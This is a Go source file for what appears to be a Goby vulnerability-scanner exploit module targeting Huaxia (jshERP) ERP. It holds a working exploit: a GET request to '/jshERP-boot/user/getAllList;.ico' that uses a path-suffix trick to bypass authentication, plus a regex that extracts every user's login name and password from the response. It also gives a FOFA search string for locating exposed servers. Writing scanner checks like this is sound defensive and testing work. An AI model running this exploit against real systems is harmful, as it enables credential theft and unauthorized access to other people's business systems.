package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "huaxiaERP user password leak vulnerability",
    "Description": "<p>Huaxia ERP is a system based on SpringBoot framework and SaaS model.</p><p>There is an account and password disclosure vulnerability in Huaxia ERP. An attacker can use this vulnerability to obtain all account passwords of the system and log in to the system to conduct malicious attacks.</p>",
    "Product": "huaxiaERP",
    "Homepage": "https://gitee.com/jishenghua/JSH_ERP",
    "DisclosureDate": "2022-09-16",
    "Author": "tardc",
    "FofaQuery": "body=\"jshERP\"",
    "GobyQuery": "body=\"jshERP\"",
    "Level": "3",
    "Impact": "<p>An attacker can use this vulnerability to obtain all account passwords of the system and log in to the system to conduct malicious attacks.</p>",
    "Recommendation": "<p>At present, the official security version has not been released to fix this vulnerability. It is recommended to contact the manufacturer for reinforcement suggestions: https://gitee.com/jishenghua/JSH_ERP.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/jshERP-boot/user/getAllList;.ico",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "userList",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "loginName",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/jshERP-boot/user/getAllList;.ico",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"userList\":(.*)}}"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "华夏 ERP 系统 getAllList 文件信息泄露漏洞",
            "Product": "华夏ERP",
            "Description": "<p><span style=\"color: rgba(0, 0, 0, 0.85); font-size: 12px;\">华夏 ERP 是一个基于SpringBoot框架和 SaaS模式的系统。</span></p><p><span style=\"color: rgba(0, 0, 0, 0.85); font-size: 12px;\">华夏 ERP 存在帐号密码泄露漏洞，攻击者可利用该漏洞获取系统所有账号密码从而登录系统进行恶意攻击。</span></p>",
            "Recommendation": "<p><span style=\"color: rgba(0, 0, 0, 0.85); font-size: 12px;\">目前官方暂未发布安全版本修复此漏洞，建议联系厂商获取加固建议：https://gitee.com/jishenghua/JSH_ERP。</span><br><br></p>",
            "Impact": "<p><span style=\"color: rgba(0, 0, 0, 0.85); font-size: 12px;\">攻击者可利用该漏洞获取系统所有账号密码从而登录系统进行恶意攻击。</span><br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "huaxiaERP user password leak vulnerability",
            "Product": "huaxiaERP",
            "Description": "<p>Huaxia ERP is a system based on SpringBoot framework and SaaS model.</p><p>There is an account and password disclosure vulnerability in Huaxia ERP. An attacker can use this vulnerability to obtain all account passwords of the system and log in to the system to conduct malicious attacks.</p>",
            "Recommendation": "<p>At present, the official security version has not been released to fix this vulnerability. It is recommended to contact the manufacturer for reinforcement suggestions: https://gitee.com/jishenghua/JSH_ERP.<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">An attacker can use this vulnerability to obtain all account passwords of the system and log in to the system to conduct malicious attacks.</span><br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9941"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}